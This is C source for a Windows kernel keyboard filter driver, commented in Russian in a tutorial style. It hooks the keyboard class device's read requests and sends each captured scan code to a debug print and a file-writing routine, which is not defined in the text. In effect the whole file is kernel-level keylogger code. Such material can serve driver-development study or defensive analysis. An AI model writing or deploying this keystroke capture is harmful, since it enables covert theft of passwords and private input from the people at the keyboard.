#include <ntddk.h>
//#include <wdf.h>

//В этом простом примере мы использовали также директивы #pragma alloc_text(INIT, DriverEntry) и #pragma alloc_text(PAGE, UnloadRoutine). Объясню что они означают: первая помещает функцию DriverEntry в INIT секцию, то есть как бы говорит, что DriverEntry будет выполнена один раз и после этого код функции можно спокойно выгрузить из памяти. Вторая помечает код функции UnloadRoutine как выгружаемый, т.е. при необходимости, система может переместить его в файл подкачки, а потом забрать его оттуда.

/*
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, Unload)
*/

/*
typedef struct _DEVICE_EXTENSION { PDEVICE_OBJECT pKeyboardDevice;
									PETHREAD pThreadObj;
									bool bhThreadTerminate;
									HANDLE hLogFile;
									KEY_STATE kState;
									KSEMAPHORE semQueue;
									KSPIN_LOCK lockQueue;
									LIST_ENTRY QueueListHead;
									} DEVICE_EXTENSION, *PDEVICE_EXTENSION;
*/

//Структура соответствует нажатой клавише
typedef struct _KEYBOARD_INPUT_DATA { 
									USHORT UnitId;
									USHORT MakeCode;
									USHORT Flags;
									USHORT Reserved;
									ULONG ExtraInformation;
									} KEYBOARD_INPUT_DATA, *PKEYBOARD_INPUT_DATA;


typedef struct _DEVICE_EXTENSION {
	PDEVICE_OBJECT pKeyboardDevice;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

LONG64 volatile REQUESTS; //число незавершённых запросов

NTSTATUS ReadCompleted(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context)
{
	//PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;

	PKEYBOARD_INPUT_DATA keys;

	//Проверка завершения запроса
	if (pIrp->IoStatus.Status == STATUS_SUCCESS)
	{
		keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
		//Получаем количество букв
		int nKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

		//Вывод каждой
		for (int i = 0; i < nKeys; ++i)
		{
			DbgPrint("Code: %x\n", keys[i].MakeCode);
			//Запись в файл
			WriteToFile(keys[i].MakeCode);
		}
	}

	//Если IRP задержан
	if (pIrp->PendingReturned)
	{
		IoMarkIrpPending(pIrp);
		InterlockedDecrement64(&REQUESTS);
	}

	return pIrp->IoStatus.Status;

}

NTSTATUS DispatchSkip(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	DbgPrint("Entering dispatchskip\n");
	//Отправляем IRP пакет ниже по стеку, не изменяя его
	IoSkipCurrentIrpStackLocation(pIrp);
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
}

//Обработка запросов на чтение
NTSTATUS DispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{

	InterlockedIncrement64(&REQUESTS);

	//Настраиваем указатель стека для нижележащего драйвера
	IoCopyCurrentIrpStackLocationToNext(pIrp);

	//По выполнении запроса вызываем указанную функцию
	IoSetCompletionRoutine(pIrp, ReadCompleted, pDeviceObject, TRUE, TRUE, TRUE);

	

	//Передаём IRP следующему драйверу
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);

}


//Функция выгрузки драйвера
VOID Unload(PDRIVER_OBJECT pDriverObject) 
{
	//Получаем указатель на PDEVICE_EXTENSION
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

	//Убираем устройство из стэка
	IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);
	
	//Ожидаем, пока закончатся все IRP пакеты
	if (REQUESTS != 0)
	{
		DbgPrint("Waiting timer\n");
		KTIMER timer;
		LARGE_INTEGER timeout;
		timeout.QuadPart = 1000000; // 0,1 c
		KeInitializeTimer(&timer);

		while (REQUESTS > 0)
		{
			KeSetTimer(&timer, timeout, NULL);
			KeWaitForSingleObject(&timer, Executive, KernelMode, FALSE, NULL);
		}
	}
	
	//Удаляем устройство
	IoDeleteDevice(pDriverObject->DeviceObject);
	return;
}

//Установка фильтра
NTSTATUS KeyboardFilter(PDRIVER_OBJECT pDriverObject) 
{
	//Объект устройства
	PDEVICE_OBJECT pKeyboardDeviceObject;
	NTSTATUS NtStatus = 0;

	//Создаём объект устройства (Driver object) 
	NtStatus = IoCreateDevice(pDriverObject,
		sizeof(DEVICE_EXTENSION),
		NULL,
		FILE_DEVICE_KEYBOARD,	//Тип устройства
		0,
		TRUE, //FALSE
		&pKeyboardDeviceObject);

	//Устройство создано
	if (NtStatus == STATUS_SUCCESS)
	{
		//Установка флагов
		pKeyboardDeviceObject->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE);
		pKeyboardDeviceObject->Flags &= (~DO_DEVICE_INITIALIZING);

		//Обнуляем струтуру DeviceExtension
		RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
		PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension;

		//Преобразование имени устройства
		CCHAR cName[40] = "\\Device\\KeyboardClass0";
		STRING strName;
		UNICODE_STRING ustrDeviceName;

		RtlInitAnsiString(&strName, cName);
		RtlAnsiStringToUnicodeString(&ustrDeviceName, &strName, TRUE);

		//Добавляем устройство в стек
		//В &pKeyboardDeviceExtension->pKeyboardDevice хранится адрес нижележащего устройства
		IoAttachDevice(pKeyboardDeviceObject, &ustrDeviceName, &pKeyboardDeviceExtension->pKeyboardDevice);
		//Освобождаем место, выделенное под строку
		RtlFreeUnicodeString(&ustrDeviceName);		
		DbgPrint("Keyboard filter installed\n");
	}
	else
	{
		DbgPrint("Installing keyboard filter error\n");
	}

	return NtStatus;
}


//Входная точка
//PDRIVER_OBJECT - адрес объекта драйвера
//PUNICODE_STRING - путь в реестре к подразделу драйвера
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	DbgPrint("Loading driver...\n");
	REQUESTS = 0;
	NTSTATUS NtStatus = 0; //STATUS_SUCCESS;
	unsigned int uiIndex = 0;

	//Регистрация драйвером точек входа в свои рабочие процедуры
	for (uiIndex = 0; uiIndex < IRP_MJ_MAXIMUM_FUNCTION; ++uiIndex)
	{
		//Отправляем IRP пакет ниже
		pDriverObject->MajorFunction[uiIndex] = DispatchSkip;
	}
	//Перехватываем IRP_MJ_READ
	pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;

	//DbgPrint("Entering hook routine\n");
	//Помещаем наше устройство в стэк
	NtStatus = KeyboardFilter(pDriverObject);

	//Функция выгрузки драйвера из памяти
	pDriverObject->DriverUnload = Unload;

	return NtStatus;
}

